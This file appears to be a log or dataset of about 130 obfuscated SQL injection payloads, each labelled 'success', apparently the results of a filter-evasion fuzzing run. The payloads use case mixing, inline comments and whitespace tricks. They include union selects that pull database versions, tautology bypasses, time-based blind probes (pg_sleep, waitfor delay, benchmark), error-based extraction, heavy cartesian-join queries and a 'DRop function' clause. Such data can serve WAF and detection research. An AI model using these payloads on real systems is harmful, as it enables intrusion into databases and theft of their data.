785 success '0x1,  (  SELEct\n  (  case wHeN  /**/(  \']5"\' LIke \']5"\'  )   tHen 0x1 ELsE 1/  (  seLEcT (sELecT (SELECT 0))  )   End   )    )    '
788 success 'SElecT * froM users WHeRE id  =  0x1 + $+%1 || 1  =\t 1 -- 1 Dj'
789 success 'iif  (  7011   LIKE   2522,1,0x1/0  )   '
796 success ' SeLecT * froM users where id   LikE   1 OR ";[" OR \'}~8^/\' LIKE \'}~8^/\' And 5598 in (5597,5598,5599) -- 1 '
799 success 'call/*f$-\x0b<*/regexp_substring  (  repeat  (  leFt  (  crypt_key  (  char  (  65  )   || char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,0x1dcd6500  )  ,null  )   AND    (    (     (  "%"  =  " '
810 success "1'\twhere\t0x639  =  0x639 OR False\t"
817 success "0x1'\nin boolean mode \t)\t /**/union all selEcT null,null,null,null,null--\t"
822 success 'iif \xa0( /*2Ozn*/4460   lIKE   1610,1,1/0  )   '
823 success ' sELect * FroM users WheRe id \t=  0x1 oR @#",   liKE   0x1 union SELEcT 1,version  (   \xa0)\xa0  -- 1 '
829 success 'SeLeCt CasE wHEN 2599 \n=  7035 THen (seLEcT 1) eLSE null ENd-- '
830 success "sElect count  (  *  )   FROM domain.domains AS t1,domain.columns as t2,domain.tables AS t3 And    (    (  /**/'zaru'  =  'zaru "
831 success '-6731"/*W>~7*/WhERE 6166   like   6166 AND 4513<>4514\nunion all selECt\n6166,6166,6166,6166,0x1816,6166-- \x0cv'
834 success '1" wHere 2619 \x0c LIKE   2619 And 2823  =  5100# fh'
837 success "0x1 aNd   (  SElEcT 2*  (  If\n  (    (   selECt * froM   (  seLeCt concat  (  0x7171706a71,  (  sELect   (  elt  (  '/`' not like '/`f',(sElect 1)   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj %U5a}b"
838 success ' sElEcT * FrOm users WhERe id  =  1 || @#"{  =  1 oR 1427 IN (1426,1427,1428) AnD 1 -- 1 '
840 success ' sElEct * frOm users wHERE\x0cid\n  liKE   1. union SeLeCT null,version  ( /**/  )   -- 1 b5W&'
843 success "-5379'/**//**/)\x0c  union all sElect 4294,0x10c6,4294--/**/89"
851 success "0x1' wHeRe 0x415  =  1045 oR False oR 6793  =    (  SElecT 6793/*T;2F*/FROM pg_sleep  (  5   )    )   -- "
852 success 'SEleCT count  (  */*sm\tjc*/ )   FroM rdb$fields as t1,rdb$types AS\x0ct2,rdb$collations As t3,rdb$functions as t4  and     (  \x0c (     (  "dskh"   lIke   "dskh '
853 success ' ( /**/cAse WHEN 8422   LIKE   0x2104 THen 1 eLSe null enD  )  '
854 success "0x1'||  (  select/**/'kyhs'\xa0fRoM\x0cdual WhEre 322!=323 AND 836<>837 AND 1 AND True\xa0"
855 success 'SElecT count  (  *  )   FRoM sysibm.systables aS t1,sysibm.systables as t2,sysibm.systables/**/AS t3 And    ( /*Q3|*/  (   "%"   lIkE   " '
858 success 'iif \t(  4638   LIKE /**/ 8258,1,1/0  )   '
860 success "1'+/**/ (  seLECT eluw WHErE 3223<>0xc98 "
863 success ' seLecT * FRoM users WhERe id   LIkE   (sELEcT 1) *\\. union SeLeCT null,@@VERSION -- 1 2X'
865 success ' SElECT * FroM users WhERe id   LIkE   1 || 1#"? union SelECt \'a\',version  (    )  \n-- 1 u'
867 success '0x1  )   wHERe 7588  =  0x1da4 oR 0 OR 7417  =    (  SELecT count  (  *  )   FroM sysibm.systables aS t1,sysibm.systables As t2,sysibm.systables aS t3 \t) \x0c-- F.'
868 success '-9958"  )   AS jzvq WhERe 3741   LikE   3741 union all SeLECt 3741,3741,3741# '
870 success 'seLeCt count /**/(  *  )   From sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables as t3 aND   (  "lsvg" LiKE "lsvg '
880 success "-(SELECT 0x260b)' || 9668 NOT LIKE 9669 OR '2E' NOT LIKE '2E'-- "
885 success 'iif  (  5257   LIKE   5257 OR 0,1,1/0  )   '
888 success 'sELeCT  /**/(  CaSe WHEN   ( \n(SeLECT 8978)   LIKE   0x592  )   tHeN 1 ElSe 0x2312*  (  SELEct 8978 frOM master..sysdatabases  )   ENd  )  -- o'
892 success "-1236'+  (  select 'fbgh'\tWHEre/**/3896  =  3896 OR 5871<>5871 union all SEleCt 0xf38,0xf38,3896,3896,3896,0xf38,0xf38,3896,3896-- U"
895 success "-8521'+  (  SElEcT ucim WHeRe 9003  =  9003 union all SeLEcT 9003-- "
897 success ' sELEcT * FRoM users WHere id  =/**/ 1 +\\. union SELeCt null,@@VERSION -- 1\xa0'
899 success '0x1 WHeRe 7906 /**/=  7906 Or 8156  =    (  sElECT count  (  *  )   fROM\ngenerate_series  (  1,5000000   )    )   -- @N'
900 success '-0x2431"/*?H\\*/ )   OR 7834\x0b  LIKE   1685 '
903 success 'SElECT   (  Case WHEN   (  0xdd1  =  5218  )   THeN 3537 Else 3537*  (  seLect 0xdd1 froM mysql.db  )   END  )  # Ll7'
908 success "-5751  )   aS jybu whEre 4739  =  4739 Or 'yn'<>'yn' OR 2724 iN    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  SeLeCt   (  CASe WheN   (  2724  =  2724  )   TheN char \xa0(  49  )   ELSe char  (  48  )   EnD   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- "
913 success 'oR/*p*/(seleCT (SeLeCT (SElECt (SELECT 1)))) IN   ( \x0cSEleCt @@version  )  -- Y}'
914 success 'sELeCT casE when 0x1dd2   LikE \x0c 3954 THEn 1 ELSe null end-- '
917 success ' SElEct * FROm/**/users WHErE id  =  1.<1# union select 1,version  (    )   -- 1 3\x0c'
921 success '0x1  )   wHERe 0x1b72  \nlIKE   0x1b72 '
930 success '0x1  )  /**/AS ewnv WheRE 0xd41  =  3393 anD 0xa9c   LIKE     (  sELECt count  (  *  )   From sysusers as sys1,sysusers As sys2,sysusers aS sys3,sysusers As sys4,sysusers as sys5,sysusers AS sys6,sysusers As sys7  )\t -- ]@'
932 success '1 WhERe 4498<>4499 '
933 success "0x1'/**/and 6969  =    (  select/**/0x1b39 from pg_sleep  (  0x5   )   /*ksE*/)    and 'dgvg'  =  'dgvg "
935 success " Or uname\x0bLiKe '% "
938 success '0x1  )   whERe\x0b1487   LIKE /**//**/1487 '
941 success 'SeLeCT dbms_pipe.receive_message /**H\x0b*/(  chr  (  66  )  ||chr  (  67  )  ||chr  (  (SELECT 79)  )  ||chr  (  101  )\t ,5  )   FROM dual aNd    (    (   "gydr" LIKe "gydr '
944 success "-0x248e'\x0b|| 9887\t  LIKE   2569-- "
946 success "-0x178e%'/*A+On*/ )   ||\t3038   LIKE   3038 OR 4792 LIKE 4793 OR 0 "
948 success "1'/**/and 9198 \x0b like   9198-- "
950 success "0x1' wHere 8437  =  8437 OR 'qa'<>'qa' AND True && make_set  (  8403 \t LiKe   (SeleCt 8403),8899  )  -- "
952 success 'SELECT count  (  *  )   FRom domain.domains As/*,*/t1,domain.columns AS t2,domain.tables As t3 and "%"  =\n " '
953 success "waitfor delay/*@ZY*/'0:0:0x5' "
955 success ' sELecT * FRom users whERE id  =  1 OR @#";  = \t1 or 1  =  1 oR False -- 1 '
956 success '0x1" WhERe \'9f>\'\x0bNOT LIKE \'9f>3\' '
959 success '-8868"  )   WHERE/**/5681\xa0  liKe   5681 OR 0x0 AnD 1 union all sELEct 5681,5681,5681,5681,5681,5681,5681,5681,5681,0x1631-- '
960 success "hi' OR\xa00x1  =  (sELECT 0x1) oR 0x796!=1942\x0b-- qB"
964 success "1'+  (  SeleCT rdwb wHerE 2498  =  2498 And 3429  =  7639-- "
966 success "a'/**/--/**/"
967 success "1'+  ( /**/select 'vtyw'\x0cwhERE 7950   LIKE /**/\t7950 order by 0x1-- "
970 success 'selecT   (  cASE WheN   (  6166   LiKE   0xd24  )  \x0bTheN 6166 ELSe cast  (  1 AS int/**/ )  /  (  SEleCt 0/**/from dual /*i*/)   enD  )   fRom dual--  *'
974 success "-7501'+  (  SeLECT uloc whERE 0xc11 \x0b liKe\t  3089 union all SelECt 3089,3089,3089,3089,3089,3089,0xc11,3089,3089,3089-- "
975 success 'SeLECt   (  CasE wheN   (  8331  =  0x15f9  )   THen 8331 ElsE 8331*  (  sElEct 8331 fRoM mysql.db  )   end  )  # '
979 success 'sELect pg_sleep /**/(  5 /*igC*/)   aND "zhsc"   LiKe   "zhsc '
980 success 'SELect/**/benchmark  (  5000000,md5  (\xa0 0x4c4d6142   ) \n  )   # idxq '
984 success 'make_set \n(  5679   LIKE   9769,9769/**/ )   '
988 success 'SeLECT   (  cAse wHen\x0c  (  9030/**/ =  (SElECT 0x23e1)  )   tHeN 9030 Else 9030*  (  selEcT 9030 fROm\tinformation_schema.character_sets  )   enD  )  # ?'
990 success "1'+  (  SeleCt/*GF*/dklj wHerE 3265   like   3265 "
995 success "0x1'  )   WheRe 0x45b   LIKE   1115\nand 289 LIKE 289 OR 0/**/AND/**/True "
998 success '1" WHere 2744 like 2744 AND 483 not like 484 AND 843 LIKE 843 OR 0 anD char  (  120  )   OR char  (  106  )  ||char  (  117  )  ||char  (  85  )     like   regexp_substring  (  repeat  (  right \t(  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  -- '
1000 success '1 wHERE 8398 \xa0 LikE\x0b  8398 AND 7321 LIKE 7321 '
1002 success "-3107'  )   WHere 7782   like   7782 OR 8571  =  8571-- Rv"
1005 success "eND aND    (    (     (  'xzbk'   lIkE   'xzbk "
1011 success '-3321" WHerE 0x643   LIKE   1603 union all sELECt (SELECT 1603),1603,1603,1603# '
1012 success 'iF  (  8995   LIkE   9787  ) /*P\xa0*/ SeLeCt (SelECt 8995) elsE DRop function ofgg-- '
1015 success '0x1  ) \x0b whErE 2679   LikE   0xa77 Or 4915  =    (  sElEct count  (  *  )   FROM domain.domains As t1,domain.columns AS t2,domain.tables As t3/**/ )  -- <e'
1017 success '-9037%" union all/**/select/*k*/6583# '
1018 success "-0x669'\nunion\x0ball\xa0seLECT 0x12e3# ^l"
1022 success 'elt  (  2567   LIKE   9921,9921  )\x0c  '
1025 success "0x1  )  /**/aS hlit wHerE 'Zr]x8' LIKE 'Zr]x8' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  (sEleCT 5000000),md5  (  0x4b774c75   )    )      )    )     )  ,0x1  )  #\n"
1028 success 'SelEcT   (  CaSE WhEN   (\x0c 9246   LiKe   6326  )   THeN 9246 ElSE 9246*  (  SELect 9246 frOM mysql.db  )   end  )  # '
1033 success "select/**/count  (/*I*/ *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3\n )  +' "
1041 success 'SElEct   (  CAsE When \n (  4780   LIKe/*\x0bKu>E*/  4432  )\x0c  tHEn\x0b4780 ELse 4780*  (  SeleCT 4780 frOm/*[o10c*/mysql.db  )   END  )  # \tNC]'
1044 success 'seLEcT   ( \x0bCaSe WheN   (  7822   LIKE   4430  )   tHEn (SEleCT 7822) ELse 1/  (  SElECT 0  )   ENd  )/**/ -- \x0bHh'
1047 success "0x1 /**/)  \tWHErE 0x17ca \n=  0x17ca aND 'uq' NOT LIKE 'uqe' "
1051 success '-9535" order by/**/1-- '
1053 success " SelEct * fRoM users WHERe id  \x0bLiKe   '1' union SELecT \\.#,@@VERSION -- 1'\x0b!"
1056 success 'SelEct CaSe When\xa08227   LIke   1229 ThEN 1 eLsE null End-- '
1060 success " SELEcT * FROm users wHerE id  =  '1' OR ||/'C' LIKE 'C' union sELECT 1,version  (  /*I86<\n*/ )   -- 1' "
1063 success 'sElEcT * froM users WHErE id /**/=  1 <@. OR 1   liKe   1 anD/**/8876 NOT LIKE 8877 oR 3740!=3740 -- 1 '
1067 success '-(sELEcT 5322)" union/**/all selEct (SELEct 0x195e),6494,6494,0x195e,6494,6494--\x0c'
1068 success '0x1" wHErE \'<mq\'\tlIKe\x0b\'<mq\'/**/'
1069 success '-5147 ||   (  8459 \n=  8459  )  *4906 '
1080 success " OR '0x1'/**/  =  /**/'1\t"
1081 success "-0xfc0' /*$,k|*/)   wHErE 2831 NOT LIKE 2832 or 1809   liKe   0xafa# j+"
1100 success '-6733\'  )   where 4639 LIKE 4639 OR 849 LIKE 850 AND True AND True AND\n\'\xa0`e\'<>\' `e*\' union all SelEcT 0xfb8,4024,0xfb8,4024# *"'
1101 success '-7466\x0cwHeRE 5161 /**/=  5161 Or 1643!=1644\xa0'
1103 success 'SeLeCT * from users wherE id  =\xa0 1 +   (  $+  )   OR 542 lIKe 542 -- 0x1 '
1110 success 'SEleCt  \n(  cASe WhEn   (  0x1bfb   likE   (SELecT 1777)  )   theN 1 ELSe 7163* /**/(  SELEcT/**/7163 fRoM master..sysdatabases  )   End  )  -- vF'
1115 success '0x1  )   WheRe 7815  /**/LiKe   0x1e87 union all seLECT null,null,null,null,null,null,null# '
1117 success '-5963" or/**/(SELECT 9323)   like   9323 OR 0# <S'
1123 success "-1602' oR 3038  =  3038 "
1124 success 'select/**/cAsE When 2930   LIKE   7964 THEN 1/**/eLse null enD-- '
1125 success '1 &&/*s4\r6*/0x15b4   LIKE     (  SeLeCT count  (\t *  )  \x0cFRoM all_users t1,all_users/**/t2,all_users t3,all_users t4,all_users t5  )  -- gynj (SELECT 1)'
1126 success 'seLECT   (  Case WHen   (  5740   like   7636  )   ThEn 5740 ELSe cast  (  1 As int  )  /  (  sElECT 0 FRom dual  )   ENd  )   FrOm dual-- d\t'
1128 success "1 wHERE 2108 LikE 2108   (  SELECT   (  caSe wHEN   (  1927!=1928 or False Or ')' NOT LIKE ')'  )   tHen regexp_substring  (  repeat  (  lEFt  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   eLsE char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   End  )   fROm   (  values  (  0   )    )     )  -- !#"
1129 success "-9657'  )   As ziiq WHerE 7725  =  7725 AND 2554 IN (2553,2554,2555) OR 6191=6192 AND 1 oR 607\x0bLIKE 607 "
1133 success '0x1"\t\t)\xa0  WHERe 4574 In (4573,0x11de,4575) anD 1 && True '
1135 success '-8933  )   As iiyr/**/WhEre 604 In (603,604,605) union all sELect 1974,1974,1974,1974,1974# '
1140 success ' eNd AnD    (    ( \xa0 "%"   LIKE   " '
1143 success 'iif  (  1217 /*\t?-i-*/=  8831,1,1/0  )   '
